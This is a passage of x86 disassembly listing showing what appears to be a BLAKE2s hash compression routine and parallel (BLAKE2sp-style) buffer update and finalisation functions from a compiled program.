  404a13:	8b 55 c4             	mov    -0x3c(%ebp),%edx
  404a16:	33 d6                	xor    %esi,%edx
  404a18:	0f b6 b0 bb a4 42 00 	movzbl 0x42a4bb(%eax),%esi
  404a1f:	8b 74 b5 80          	mov    -0x80(%ebp,%esi,4),%esi
  404a23:	c1 c9 07             	ror    $0x7,%ecx
  404a26:	c1 ca 10             	ror    $0x10,%edx
  404a29:	01 55 e4             	add    %edx,-0x1c(%ebp)
  404a2c:	89 55 f4             	mov    %edx,-0xc(%ebp)
  404a2f:	8b 55 d4             	mov    -0x2c(%ebp),%edx
  404a32:	33 55 e4             	xor    -0x1c(%ebp),%edx
  404a35:	8b 7d dc             	mov    -0x24(%ebp),%edi
  404a38:	c1 ca 0c             	ror    $0xc,%edx
  404a3b:	03 f2                	add    %edx,%esi
  404a3d:	01 75 c4             	add    %esi,-0x3c(%ebp)
  404a40:	8b 75 c4             	mov    -0x3c(%ebp),%esi
  404a43:	33 75 f4             	xor    -0xc(%ebp),%esi
  404a46:	c1 ce 08             	ror    $0x8,%esi
  404a49:	01 75 e4             	add    %esi,-0x1c(%ebp)
  404a4c:	33 55 e4             	xor    -0x1c(%ebp),%edx
  404a4f:	89 75 f4             	mov    %esi,-0xc(%ebp)
  404a52:	8b 75 d8             	mov    -0x28(%ebp),%esi
  404a55:	c1 ca 07             	ror    $0x7,%edx
  404a58:	89 55 d4             	mov    %edx,-0x2c(%ebp)
  404a5b:	0f b6 90 bc a4 42 00 	movzbl 0x42a4bc(%eax),%edx
  404a62:	8b 54 95 80          	mov    -0x80(%ebp,%edx,4),%edx
  404a66:	03 d6                	add    %esi,%edx
  404a68:	01 55 c8             	add    %edx,-0x38(%ebp)
  404a6b:	8b 55 c8             	mov    -0x38(%ebp),%edx
  404a6e:	33 55 f8             	xor    -0x8(%ebp),%edx
  404a71:	c1 ca 10             	ror    $0x10,%edx
  404a74:	01 55 e8             	add    %edx,-0x18(%ebp)
  404a77:	33 75 e8             	xor    -0x18(%ebp),%esi
  404a7a:	89 55 f8             	mov    %edx,-0x8(%ebp)
  404a7d:	0f b6 90 bd a4 42 00 	movzbl 0x42a4bd(%eax),%edx
  404a84:	8b 54 95 80          	mov    -0x80(%ebp,%edx,4),%edx
  404a88:	c1 ce 0c             	ror    $0xc,%esi
  404a8b:	03 d6                	add    %esi,%edx
  404a8d:	01 55 c8             	add    %edx,-0x38(%ebp)
  404a90:	8b 55 c8             	mov    -0x38(%ebp),%edx
  404a93:	33 55 f8             	xor    -0x8(%ebp),%edx
  404a96:	c1 ca 08             	ror    $0x8,%edx
  404a99:	01 55 e8             	add    %edx,-0x18(%ebp)
  404a9c:	33 75 e8             	xor    -0x18(%ebp),%esi
  404a9f:	89 55 f8             	mov    %edx,-0x8(%ebp)
  404aa2:	0f b6 90 be a4 42 00 	movzbl 0x42a4be(%eax),%edx
  404aa9:	8b 54 95 80          	mov    -0x80(%ebp,%edx,4),%edx
  404aad:	03 d7                	add    %edi,%edx
  404aaf:	01 55 cc             	add    %edx,-0x34(%ebp)
  404ab2:	8b 55 cc             	mov    -0x34(%ebp),%edx
  404ab5:	33 55 fc             	xor    -0x4(%ebp),%edx
  404ab8:	c1 ce 07             	ror    $0x7,%esi
  404abb:	c1 ca 10             	ror    $0x10,%edx
  404abe:	01 55 ec             	add    %edx,-0x14(%ebp)
  404ac1:	33 7d ec             	xor    -0x14(%ebp),%edi
  404ac4:	89 75 d8             	mov    %esi,-0x28(%ebp)
  404ac7:	89 55 fc             	mov    %edx,-0x4(%ebp)
  404aca:	0f b6 90 bf a4 42 00 	movzbl 0x42a4bf(%eax),%edx
  404ad1:	8b 54 95 80          	mov    -0x80(%ebp,%edx,4),%edx
  404ad5:	c1 cf 0c             	ror    $0xc,%edi
  404ad8:	03 d7                	add    %edi,%edx
  404ada:	01 55 cc             	add    %edx,-0x34(%ebp)
  404add:	8b 55 cc             	mov    -0x34(%ebp),%edx
  404ae0:	33 55 fc             	xor    -0x4(%ebp),%edx
  404ae3:	c1 ca 08             	ror    $0x8,%edx
  404ae6:	01 55 ec             	add    %edx,-0x14(%ebp)
  404ae9:	33 7d ec             	xor    -0x14(%ebp),%edi
  404aec:	89 55 fc             	mov    %edx,-0x4(%ebp)
  404aef:	0f b6 90 c0 a4 42 00 	movzbl 0x42a4c0(%eax),%edx
  404af6:	8b 74 95 80          	mov    -0x80(%ebp,%edx,4),%esi
  404afa:	8b 55 d4             	mov    -0x2c(%ebp),%edx
  404afd:	03 f2                	add    %edx,%esi
  404aff:	01 75 c0             	add    %esi,-0x40(%ebp)
  404b02:	8b 75 c0             	mov    -0x40(%ebp),%esi
  404b05:	33 75 fc             	xor    -0x4(%ebp),%esi
  404b08:	c1 cf 07             	ror    $0x7,%edi
  404b0b:	c1 ce 10             	ror    $0x10,%esi
  404b0e:	01 75 e8             	add    %esi,-0x18(%ebp)
  404b11:	33 55 e8             	xor    -0x18(%ebp),%edx
  404b14:	89 7d dc             	mov    %edi,-0x24(%ebp)
  404b17:	0f b6 b8 c1 a4 42 00 	movzbl 0x42a4c1(%eax),%edi
  404b1e:	8b 7c bd 80          	mov    -0x80(%ebp,%edi,4),%edi
  404b22:	c1 ca 0c             	ror    $0xc,%edx
  404b25:	03 fa                	add    %edx,%edi
  404b27:	01 7d c0             	add    %edi,-0x40(%ebp)
  404b2a:	89 55 d4             	mov    %edx,-0x2c(%ebp)
  404b2d:	8b 55 c0             	mov    -0x40(%ebp),%edx
  404b30:	33 d6                	xor    %esi,%edx
  404b32:	c1 ca 08             	ror    $0x8,%edx
  404b35:	01 55 e8             	add    %edx,-0x18(%ebp)
  404b38:	89 55 fc             	mov    %edx,-0x4(%ebp)
  404b3b:	8b 55 d4             	mov    -0x2c(%ebp),%edx
  404b3e:	33 55 e8             	xor    -0x18(%ebp),%edx
  404b41:	0f b6 b8 c3 a4 42 00 	movzbl 0x42a4c3(%eax),%edi
  404b48:	8b 7c bd 80          	mov    -0x80(%ebp,%edi,4),%edi
  404b4c:	c1 ca 07             	ror    $0x7,%edx
  404b4f:	89 55 d4             	mov    %edx,-0x2c(%ebp)
  404b52:	0f b6 90 c2 a4 42 00 	movzbl 0x42a4c2(%eax),%edx
  404b59:	8b 74 95 80          	mov    -0x80(%ebp,%edx,4),%esi
  404b5d:	8b 55 d8             	mov    -0x28(%ebp),%edx
  404b60:	03 f2                	add    %edx,%esi
  404b62:	01 75 c4             	add    %esi,-0x3c(%ebp)
  404b65:	8b 75 c4             	mov    -0x3c(%ebp),%esi
  404b68:	33 f3                	xor    %ebx,%esi
  404b6a:	c1 ce 10             	ror    $0x10,%esi
  404b6d:	01 75 ec             	add    %esi,-0x14(%ebp)
  404b70:	33 55 ec             	xor    -0x14(%ebp),%edx
  404b73:	c1 ca 0c             	ror    $0xc,%edx
  404b76:	03 fa                	add    %edx,%edi
  404b78:	01 7d c4             	add    %edi,-0x3c(%ebp)
  404b7b:	8b 7d c4             	mov    -0x3c(%ebp),%edi
  404b7e:	33 fe                	xor    %esi,%edi
  404b80:	c1 cf 08             	ror    $0x8,%edi
  404b83:	8b f7                	mov    %edi,%esi
  404b85:	01 75 ec             	add    %esi,-0x14(%ebp)
  404b88:	33 55 ec             	xor    -0x14(%ebp),%edx
  404b8b:	0f b6 b8 c5 a4 42 00 	movzbl 0x42a4c5(%eax),%edi
  404b92:	8b 7c bd 80          	mov    -0x80(%ebp,%edi,4),%edi
  404b96:	c1 ca 07             	ror    $0x7,%edx
  404b99:	89 55 d8             	mov    %edx,-0x28(%ebp)
  404b9c:	0f b6 90 c4 a4 42 00 	movzbl 0x42a4c4(%eax),%edx
  404ba3:	89 75 f0             	mov    %esi,-0x10(%ebp)
  404ba6:	8b 74 95 80          	mov    -0x80(%ebp,%edx,4),%esi
  404baa:	8b 55 dc             	mov    -0x24(%ebp),%edx
  404bad:	03 f2                	add    %edx,%esi
  404baf:	01 75 c8             	add    %esi,-0x38(%ebp)
  404bb2:	8b 75 c8             	mov    -0x38(%ebp),%esi
  404bb5:	33 75 f4             	xor    -0xc(%ebp),%esi
  404bb8:	c1 ce 10             	ror    $0x10,%esi
  404bbb:	01 75 e0             	add    %esi,-0x20(%ebp)
  404bbe:	33 55 e0             	xor    -0x20(%ebp),%edx
  404bc1:	c1 ca 0c             	ror    $0xc,%edx
  404bc4:	03 fa                	add    %edx,%edi
  404bc6:	01 7d c8             	add    %edi,-0x38(%ebp)
  404bc9:	8b 7d c8             	mov    -0x38(%ebp),%edi
  404bcc:	33 fe                	xor    %esi,%edi
  404bce:	c1 cf 08             	ror    $0x8,%edi
  404bd1:	8b f7                	mov    %edi,%esi
  404bd3:	01 75 e0             	add    %esi,-0x20(%ebp)
  404bd6:	33 55 e0             	xor    -0x20(%ebp),%edx
  404bd9:	0f b6 b8 c7 a4 42 00 	movzbl 0x42a4c7(%eax),%edi
  404be0:	8b 7c bd 80          	mov    -0x80(%ebp,%edi,4),%edi
  404be4:	c1 ca 07             	ror    $0x7,%edx
  404be7:	89 55 dc             	mov    %edx,-0x24(%ebp)
  404bea:	0f b6 90 c6 a4 42 00 	movzbl 0x42a4c6(%eax),%edx
  404bf1:	8b 54 95 80          	mov    -0x80(%ebp,%edx,4),%edx
  404bf5:	03 d1                	add    %ecx,%edx
  404bf7:	01 55 cc             	add    %edx,-0x34(%ebp)
  404bfa:	8b 55 cc             	mov    -0x34(%ebp),%edx
  404bfd:	33 55 f8             	xor    -0x8(%ebp),%edx
  404c00:	83 c0 10             	add    $0x10,%eax
  404c03:	c1 ca 10             	ror    $0x10,%edx
  404c06:	01 55 e4             	add    %edx,-0x1c(%ebp)
  404c09:	33 4d e4             	xor    -0x1c(%ebp),%ecx
  404c0c:	89 75 f4             	mov    %esi,-0xc(%ebp)
  404c0f:	c1 c9 0c             	ror    $0xc,%ecx
  404c12:	03 f9                	add    %ecx,%edi
  404c14:	01 7d cc             	add    %edi,-0x34(%ebp)
  404c17:	8b 7d cc             	mov    -0x34(%ebp),%edi
  404c1a:	33 fa                	xor    %edx,%edi
  404c1c:	c1 cf 08             	ror    $0x8,%edi
  404c1f:	8b d7                	mov    %edi,%edx
  404c21:	01 55 e4             	add    %edx,-0x1c(%ebp)
  404c24:	33 4d e4             	xor    -0x1c(%ebp),%ecx
  404c27:	89 55 f8             	mov    %edx,-0x8(%ebp)
  404c2a:	c1 c9 07             	ror    $0x7,%ecx
  404c2d:	89 4d d0             	mov    %ecx,-0x30(%ebp)
  404c30:	3d 90 00 00 00       	cmp    $0x90,%eax
  404c35:	0f 86 81 fd ff ff    	jbe    0x4049bc
  404c3b:	5f                   	pop    %edi
  404c3c:	5e                   	pop    %esi
  404c3d:	33 c9                	xor    %ecx,%ecx
  404c3f:	5b                   	pop    %ebx
  404c40:	8b 45 08             	mov    0x8(%ebp),%eax
  404c43:	8b 80 f4 00 00 00    	mov    0xf4(%eax),%eax
  404c49:	8b 54 0d e0          	mov    -0x20(%ebp,%ecx,1),%edx
  404c4d:	03 c1                	add    %ecx,%eax
  404c4f:	33 10                	xor    (%eax),%edx
  404c51:	83 c1 04             	add    $0x4,%ecx
  404c54:	33 54 0d bc          	xor    -0x44(%ebp,%ecx,1),%edx
  404c58:	89 10                	mov    %edx,(%eax)
  404c5a:	83 f9 20             	cmp    $0x20,%ecx
  404c5d:	72 e1                	jb     0x404c40
  404c5f:	c9                   	leave
  404c60:	c2 04 00             	ret    $0x4
  404c63:	55                   	push   %ebp
  404c64:	8b ec                	mov    %esp,%ebp
  404c66:	53                   	push   %ebx
  404c67:	8b 5d 0c             	mov    0xc(%ebp),%ebx
  404c6a:	85 db                	test   %ebx,%ebx
  404c6c:	0f 86 ab 00 00 00    	jbe    0x404d1d
  404c72:	57                   	push   %edi
  404c73:	8b 86 00 01 00 00    	mov    0x100(%esi),%eax
  404c79:	8b 8e f0 00 00 00    	mov    0xf0(%esi),%ecx
  404c7f:	bf 80 00 00 00       	mov    $0x80,%edi
  404c84:	2b f8                	sub    %eax,%edi
  404c86:	03 c8                	add    %eax,%ecx
  404c88:	3b df                	cmp    %edi,%ebx
  404c8a:	76 70                	jbe    0x404cfc
  404c8c:	57                   	push   %edi
  404c8d:	ff 75 08             	push   0x8(%ebp)
  404c90:	51                   	push   %ecx
  404c91:	e8 7a 71 01 00       	call   0x41be10
  404c96:	01 be 00 01 00 00    	add    %edi,0x100(%esi)
  404c9c:	8d 86 f8 00 00 00    	lea    0xf8(%esi),%eax
  404ca2:	8b 08                	mov    (%eax),%ecx
  404ca4:	83 01 40             	addl   $0x40,(%ecx)
  404ca7:	8b 00                	mov    (%eax),%eax
  404ca9:	83 c4 0c             	add    $0xc,%esp
  404cac:	83 38 40             	cmpl   $0x40,(%eax)
  404caf:	1b c9                	sbb    %ecx,%ecx
  404cb1:	f7 d9                	neg    %ecx
  404cb3:	01 48 04             	add    %ecx,0x4(%eax)
  404cb6:	83 3d 78 e5 44 00 02 	cmpl   $0x2,0x44e578
  404cbd:	7c 0e                	jl     0x404ccd
  404cbf:	ff b6 f0 00 00 00    	push   0xf0(%esi)
  404cc5:	56                   	push   %esi
  404cc6:	e8 13 eb ff ff       	call   0x4037de
  404ccb:	eb 0c                	jmp    0x404cd9
  404ccd:	8b 86 f0 00 00 00    	mov    0xf0(%esi),%eax
  404cd3:	56                   	push   %esi
  404cd4:	e8 69 fc ff ff       	call   0x404942
  404cd9:	8b 86 f0 00 00 00    	mov    0xf0(%esi),%eax
  404cdf:	6a 40                	push   $0x40
  404ce1:	8d 48 40             	lea    0x40(%eax),%ecx
  404ce4:	51                   	push   %ecx
  404ce5:	50                   	push   %eax
  404ce6:	e8 25 71 01 00       	call   0x41be10
  404ceb:	83 86 00 01 00 00 c0 	addl   $0xffffffc0,0x100(%esi)
  404cf2:	01 7d 08             	add    %edi,0x8(%ebp)
  404cf5:	83 c4 0c             	add    $0xc,%esp
  404cf8:	2b df                	sub    %edi,%ebx
  404cfa:	eb 18                	jmp    0x404d14
  404cfc:	53                   	push   %ebx
  404cfd:	ff 75 08             	push   0x8(%ebp)
  404d00:	51                   	push   %ecx
  404d01:	e8 0a 71 01 00       	call   0x41be10
  404d06:	01 9e 00 01 00 00    	add    %ebx,0x100(%esi)
  404d0c:	01 5d 08             	add    %ebx,0x8(%ebp)
  404d0f:	83 c4 0c             	add    $0xc,%esp
  404d12:	33 db                	xor    %ebx,%ebx
  404d14:	85 db                	test   %ebx,%ebx
  404d16:	0f 87 57 ff ff ff    	ja     0x404c73
  404d1c:	5f                   	pop    %edi
  404d1d:	5b                   	pop    %ebx
  404d1e:	5d                   	pop    %ebp
  404d1f:	c2 08 00             	ret    $0x8
  404d22:	83 be 00 01 00 00 40 	cmpl   $0x40,0x100(%esi)
  404d29:	76 44                	jbe    0x404d6f
  404d2b:	8d 86 f8 00 00 00    	lea    0xf8(%esi),%eax
  404d31:	8b 08                	mov    (%eax),%ecx
  404d33:	83 01 40             	addl   $0x40,(%ecx)
  404d36:	8b 00                	mov    (%eax),%eax
  404d38:	83 38 40             	cmpl   $0x40,(%eax)
  404d3b:	57                   	push   %edi
  404d3c:	1b c9                	sbb    %ecx,%ecx
  404d3e:	f7 d9                	neg    %ecx
  404d40:	01 48 04             	add    %ecx,0x4(%eax)
  404d43:	8d be f0 00 00 00    	lea    0xf0(%esi),%edi
  404d49:	8b 07                	mov    (%edi),%eax
  404d4b:	56                   	push   %esi
  404d4c:	e8 f1 fb ff ff       	call   0x404942
  404d51:	83 86 00 01 00 00 c0 	addl   $0xffffffc0,0x100(%esi)
  404d58:	8b 86 00 01 00 00    	mov    0x100(%esi),%eax
  404d5e:	8b 3f                	mov    (%edi),%edi
  404d60:	50                   	push   %eax
  404d61:	8d 47 40             	lea    0x40(%edi),%eax
  404d64:	50                   	push   %eax
  404d65:	57                   	push   %edi
  404d66:	e8 a5 70 01 00       	call   0x41be10
  404d6b:	83 c4 0c             	add    $0xc,%esp
  404d6e:	5f                   	pop    %edi
  404d6f:	8b 8e 00 01 00 00    	mov    0x100(%esi),%ecx
  404d75:	8d 86 f8 00 00 00    	lea    0xf8(%esi),%eax
  404d7b:	8b 10                	mov    (%eax),%edx
  404d7d:	01 0a                	add    %ecx,(%edx)
  404d7f:	8b 00                	mov    (%eax),%eax
  404d81:	39 08                	cmp    %ecx,(%eax)
  404d83:	1b c9                	sbb    %ecx,%ecx
  404d85:	f7 d9                	neg    %ecx
  404d87:	01 48 04             	add    %ecx,0x4(%eax)
  404d8a:	80 be 04 01 00 00 00 	cmpb   $0x0,0x104(%esi)
  404d91:	74 0a                	je     0x404d9d
  404d93:	8b 86 fc 00 00 00    	mov    0xfc(%esi),%eax
  404d99:	83 48 04 ff          	orl    $0xffffffff,0x4(%eax)
  404d9d:	8b 86 fc 00 00 00    	mov    0xfc(%esi),%eax
  404da3:	83 08 ff             	orl    $0xffffffff,(%eax)
  404da6:	8b 86 00 01 00 00    	mov    0x100(%esi),%eax
  404dac:	b9 80 00 00 00       	mov    $0x80,%ecx
  404db1:	2b c8                	sub    %eax,%ecx
  404db3:	51                   	push   %ecx
  404db4:	8b 8e f0 00 00 00    	mov    0xf0(%esi),%ecx
  404dba:	03 c8                	add    %eax,%ecx
  404dbc:	6a 00                	push   $0x0
  404dbe:	51                   	push   %ecx
  404dbf:	e8 dc 55 01 00       	call   0x41a3a0
  404dc4:	8b 86 f0 00 00 00    	mov    0xf0(%esi),%eax
  404dca:	83 c4 0c             	add    $0xc,%esp
  404dcd:	56                   	push   %esi
  404dce:	e8 6f fb ff ff       	call   0x404942
  404dd3:	33 c0                	xor    %eax,%eax
  404dd5:	8b 8e f4 00 00 00    	mov    0xf4(%esi),%ecx
  404ddb:	8b 0c 08             	mov    (%eax,%ecx,1),%ecx
  404dde:	8b 54 24 04          	mov    0x4(%esp),%edx
  404de2:	89 0c 10             	mov    %ecx,(%eax,%edx,1)
  404de5:	83 c0 04             	add    $0x4,%eax
  404de8:	83 f8 20             	cmp    $0x20,%eax
  404deb:	7c e8                	jl     0x404dd5
  404ded:	c2 04 00             	ret    $0x4
  404df0:	53                   	push   %ebx
  404df1:	56                   	push   %esi
  404df2:	8b 74 24 0c          	mov    0xc(%esp),%esi
  404df6:	57                   	push   %edi
  404df7:	68 00 02 00 00       	push   $0x200
  404dfc:	33 ff                	xor    %edi,%edi
  404dfe:	8d 86 48 09 00 00    	lea    0x948(%esi),%eax
  404e04:	57                   	push   %edi
  404e05:	50                   	push   %eax
  404e06:	e8 95 55 01 00       	call   0x41a3a0
  404e0b:	83 c4 0c             	add    $0xc,%esp
  404e0e:	33 c0                	xor    %eax,%eax
  404e10:	57                   	push   %edi
  404e11:	8d 8e 40 08 00 00    	lea    0x840(%esi),%ecx
  404e17:	40                   	inc    %eax
  404e18:	89 be 48 0b 00 00    	mov    %edi,0xb48(%esi)
  404e1e:	e8 bb fa ff ff       	call   0x4048de
  404e23:	8b de                	mov    %esi,%ebx
  404e25:	57                   	push   %edi
  404e26:	33 c0                	xor    %eax,%eax
  404e28:	8b cb                	mov    %ebx,%ecx
  404e2a:	e8 af fa ff ff       	call   0x4048de
  404e2f:	47                   	inc    %edi
  404e30:	81 c3 08 01 00 00    	add    $0x108,%ebx
  404e36:	83 ff 08             	cmp    $0x8,%edi
  404e39:	72 ea                	jb     0x404e25
  404e3b:	5f                   	pop    %edi
  404e3c:	c6 86 44 09 00 00 01 	movb   $0x1,0x944(%esi)
  404e43:	c6 86 3c 08 00 00 01 	movb   $0x1,0x83c(%esi)
  404e4a:	5e                   	pop    %esi
  404e4b:	5b                   	pop    %ebx
  404e4c:	c2 04 00             	ret    $0x4
  404e4f:	51                   	push   %ecx
  404e50:	53                   	push   %ebx
  404e51:	55                   	push   %ebp
  404e52:	8b d9                	mov    %ecx,%ebx
  404e54:	8b 6b 08             	mov    0x8(%ebx),%ebp
  404e57:	8b 43 04             	mov    0x4(%ebx),%eax
  404e5a:	57                   	push   %edi
  404e5b:	bf 00 02 00 00       	mov    $0x200,%edi
  404e60:	89 44 24 0c          	mov    %eax,0xc(%esp)
  404e64:	3b ef                	cmp    %edi,%ebp
  404e66:	72 34                	jb     0x404e9c
  404e68:	56                   	push   %esi
  404e69:	eb 04                	jmp    0x404e6f
  404e6b:	8b 44 24 10          	mov    0x10(%esp),%eax
  404e6f:	83 3d 78 e5 44 00 01 	cmpl   $0x1,0x44e578
  404e76:	7c 0f                	jl     0x404e87
  404e78:	81 fd 00 04 00 00    	cmp    $0x400,%ebp
  404e7e:	72 07                	jb     0x404e87
  404e80:	0f 18 88 00 02 00 00 	prefetcht0 0x200(%eax)
  404e87:	8b 33                	mov    (%ebx),%esi
  404e89:	6a 40                	push   $0x40
  404e8b:	50                   	push   %eax
  404e8c:	e8 d2 fd ff ff       	call   0x404c63
  404e91:	01 7c 24 10          	add    %edi,0x10(%esp)
  404e95:	2b ef                	sub    %edi,%ebp
  404e97:	3b ef                	cmp    %edi,%ebp
  404e99:	73 d0                	jae    0x404e6b
  404e9b:	5e                   	pop    %esi
  404e9c:	5f                   	pop    %edi
  404e9d:	5d                   	pop    %ebp
  404e9e:	5b                   	pop    %ebx
  404e9f:	59                   	pop    %ecx
  404ea0:	c3                   	ret
  404ea1:	8b 4c 24 04          	mov    0x4(%esp),%ecx
  404ea5:	e8 a5 ff ff ff       	call   0x404e4f
  404eaa:	c2 04 00             	ret    $0x4
  404ead:	55                   	push   %ebp
  404eae:	8b ec                	mov    %esp,%ebp
  404eb0:	83 ec 70             	sub    $0x70,%esp
  404eb3:	53                   	push   %ebx
  404eb4:	8b 5d 08             	mov    0x8(%ebp),%ebx
  404eb7:	56                   	push   %esi
  404eb8:	8b b3 48 0b 00 00    	mov    0xb48(%ebx),%esi
  404ebe:	57                   	push   %edi
  404ebf:	bf 00 02 00 00       	mov    $0x200,%edi
  404ec4:	2b fe                	sub    %esi,%edi
  404ec6:	89 75 fc             	mov    %esi,-0x4(%ebp)
  404ec9:	85 f6                	test   %esi,%esi
  404ecb:	74 51                	je     0x404f1e
  404ecd:	39 7d 10             	cmp    %edi,0x10(%ebp)
  404ed0:	72 4c                	jb     0x404f1e
  404ed2:	57                   	push   %edi
  404ed3:	ff 75 0c             	push   0xc(%ebp)
  404ed6:	8d 84 1e 48 09 00 00 	lea    0x948(%esi,%ebx,1),%eax
  404edd:	50                   	push   %eax
  404ede:	e8 2d 6f 01 00       	call   0x41be10
  404ee3:	8d 83 48 09 00 00    	lea    0x948(%ebx),%eax
  404ee9:	83 c4 0c             	add    $0xc,%esp
  404eec:	8b f3                	mov    %ebx,%esi
  404eee:	89 45 08             	mov    %eax,0x8(%ebp)
  404ef1:	c7 45 f0 08 00 00 00 	movl   $0x8,-0x10(%ebp)
  404ef8:	6a 40                	push   $0x40
  404efa:	ff 75 08             	push   0x8(%ebp)
  404efd:	e8 61 fd ff ff       	call   0x404c63
  404f02:	83 45 08 40          	addl   $0x40,0x8(%ebp)
  404f06:	81 c6 08 01 00 00    	add    $0x108,%esi
  404f0c:	ff 4d f0             	decl   -0x10(%ebp)
  404f0f:	75 e7                	jne    0x404ef8
  404f11:	01 7d 0c             	add    %edi,0xc(%ebp)
  404f14:	29 7d 10             	sub    %edi,0x10(%ebp)
  404f17:	83 65 fc 00          	andl   $0x0,-0x4(%ebp)
  404f1b:	8b 75 fc             	mov    -0x4(%ebp),%esi
  404f1e:	81 7d 10 00 10 00 00 	cmpl   $0x1000,0x10(%ebp)
  404f25:	73 09                	jae    0x404f30
  404f27:	c7 45 08 01 00 00 00 	movl   $0x1,0x8(%ebp)
  404f2e:	eb 1a                	jmp    0x404f4a
  404f30:	8b 83 50 0b 00 00    	mov    0xb50(%ebx),%eax
  404f36:	89 45 08             	mov    %eax,0x8(%ebp)
  404f39:	83 f8 06             	cmp    $0x6,%eax
  404f3c:	74 05                	je     0x404f43
  404f3e:	83 f8 07             	cmp    $0x7,%eax
  404f41:	75 07                	jne    0x404f4a
  404f43:	c7 45 08 04 00 00 00 	movl   $0x4,0x8(%ebp)
  404f4a:	33 c0                	xor    %eax,%eax
  404f4c:	89 45 f8             	mov    %eax,-0x8(%ebp)
  404f4f:	83 65 f0 00          	andl   $0x0,-0x10(%ebp)
  404f53:	83 7d 08 00          	cmpl   $0x0,0x8(%ebp)
  404f57:	76 6a                	jbe    0x404fc3
  404f59:	8b f0                	mov    %eax,%esi
  404f5b:	69 f6 08 01 00 00    	imul   $0x108,%esi,%esi
  404f61:	c1 e0 06             	shl    $0x6,%eax
  404f64:	03 f3                	add    %ebx,%esi
  404f66:	03 45 0c             	add    0xc(%ebp),%eax
  404f69:	8d 7d 90             	lea    -0x70(%ebp),%edi
  404f6c:	89 45 f4             	mov    %eax,-0xc(%ebp)
  404f6f:	eb 03                	jmp    0x404f74
  404f71:	8b 45 f4             	mov    -0xc(%ebp),%eax
  404f74:	83 7d f8 08          	cmpl   $0x8,-0x8(%ebp)
  404f78:	73 46                	jae    0x404fc0
  404f7a:	83 7d 08 01          	cmpl   $0x1,0x8(%ebp)
  404f7e:	8b 4d 10             	mov    0x10(%ebp),%ecx
  404f81:	89 4f 08             	mov    %ecx,0x8(%edi)
  404f84:	89 47 04             	mov    %eax,0x4(%edi)
  404f87:	89 37                	mov    %esi,(%edi)
  404f89:	76 13                	jbe    0x404f9e
  404f8b:	8b 8b 4c 0b 00 00    	mov    0xb4c(%ebx),%ecx
  404f91:	57                   	push   %edi
  404f92:	68 a1 4e 40 00       	push   $0x404ea1
  404f97:	e8 e9 be 00 00       	call   0x410e85
  404f9c:	eb 07                	jmp    0x404fa5
  404f9e:	8b cf                	mov    %edi,%ecx
  404fa0:	e8 aa fe ff ff       	call   0x404e4f
  404fa5:	ff 45 f8             	incl   -0x8(%ebp)
  404fa8:	83 45 f4 40          	addl   $0x40,-0xc(%ebp)
  404fac:	81 c6 08 01 00 00    	add    $0x108,%esi
  404fb2:	ff 45 f0             	incl   -0x10(%ebp)
  404fb5:	8b 45 f0             	mov    -0x10(%ebp),%eax
  404fb8:	83 c7 0c             	add    $0xc,%edi
  404fbb:	3b 45 08             	cmp    0x8(%ebp),%eax
  404fbe:	72 b1                	jb     0x404f71
  404fc0:	8b 75 fc             	mov    -0x4(%ebp),%esi
  404fc3:	8b 8b 4c 0b 00 00    	mov    0xb4c(%ebx),%ecx
  404fc9:	85 c9                	test   %ecx,%ecx
  404fcb:	74 05                	je     0x404fd2
  404fcd:	e8 66 bc 00 00       	call   0x410c38
  404fd2:	8b 45 f8             	mov    -0x8(%ebp),%eax
  404fd5:	83 f8 08             	cmp    $0x8,%eax
  404fd8:	0f 82 71 ff ff ff    	jb     0x404f4f
  404fde:	8b 45 10             	mov    0x10(%ebp),%eax
  404fe1:	8b f8                	mov    %eax,%edi
  404fe3:	81 e7 ff 01 00 00    	and    $0x1ff,%edi
  404fe9:	2b c7                	sub    %edi,%eax
  404feb:	01 45 0c             	add    %eax,0xc(%ebp)
  404fee:	85 ff                	test   %edi,%edi
  404ff0:	76 14                	jbe    0x405006
  404ff2:	57                   	push   %edi
  404ff3:	ff 75 0c             	push   0xc(%ebp)
  404ff6:	8d 84 1e 48 09 00 00 	lea    0x948(%esi,%ebx,1),%eax
  404ffd:	50                   	push   %eax
  404ffe:	e8 0d 6e 01 00       	call   0x41be10
  405003:	83 c4 0c             	add    $0xc,%esp
  405006:	03 f7                	add    %edi,%esi
  405008:	5f                   	pop    %edi
  405009:	89 b3 48 0b 00 00    	mov    %esi,0xb48(%ebx)
  40500f:	5e                   	pop    %esi
  405010:	5b                   	pop    %ebx
  405011:	c9                   	leave
  405012:	c2 0c 00             	ret    $0xc
  405015:	55                   	push   %ebp
  405016:	8b ec                	mov    %esp,%ebp
  405018:	81 ec 04 01 00 00    	sub    $0x104,%esp
  40501e:	53                   	push   %ebx
  40501f:	56                   	push   %esi
  405020:	8d 85 fc fe ff ff    	lea    -0x104(%ebp),%eax
  405026:	57                   	push   %edi
  405027:	8b 7d 08             	mov    0x8(%ebp),%edi
  40502a:	89 45 fc             	mov    %eax,-0x4(%ebp)
  40502d:	8d 87 48 09 00 00    	lea    0x948(%edi),%eax
  405033:	33 db                	xor    %ebx,%ebx
  405035:	8b f7                	mov    %edi,%esi
  405037:	89 45 08             	mov    %eax,0x8(%ebp)
  40503a:	8b 87 48 0b 00 00    	mov    0xb48(%edi),%eax
  405040:	3b c3                	cmp    %ebx,%eax
  405042:	76 13                	jbe    0x405057
  405044:	2b c3                	sub    %ebx,%eax
  405046:	83 f8 40             	cmp    $0x40,%eax
  405049:	76 03                	jbe    0x40504e
  40504b:	6a 40                	push   $0x40
  40504d:	58                   	pop    %eax
  40504e:	50                   	push   %eax
  40504f:	ff 75 08             	push   0x8(%ebp)
  405052:	e8 0c fc ff ff       	call   0x404c63
  405057:	ff 75 fc             	push   -0x4(%ebp)
  40505a:	e8 c3 fc ff ff       	call   0x404d22
  40505f:	83 45 08 40          	addl   $0x40,0x8(%ebp)
  405063:	83 45 fc 20          	addl   $0x20,-0x4(%ebp)
  405067:	83 c3 40             	add    $0x40,%ebx
  40506a:	81 c6 08 01 00 00    	add    $0x108,%esi
  405070:	81 fb 00 02 00 00    	cmp    $0x200,%ebx
  405076:	72 c2                	jb     0x40503a
  405078:	6a 08                	push   $0x8
  40507a:	8d b7 40 08 00 00    	lea    0x840(%edi),%esi
  405080:	8d bd fc fe ff ff    	lea    -0x104(%ebp),%edi
  405086:	5b                   	pop    %ebx
  405087:	6a 20                	push   $0x20
  405089:	57                   	push   %edi
  40508a:	e8 d4 fb ff ff       	call   0x404c63
  40508f:	83 c7 20             	add    $0x20,%edi
  405092:	4b                   	dec    %ebx
  405093:	75 f2                	jne    0x405087
  405095:	ff 75 0c             	push   0xc(%ebp)
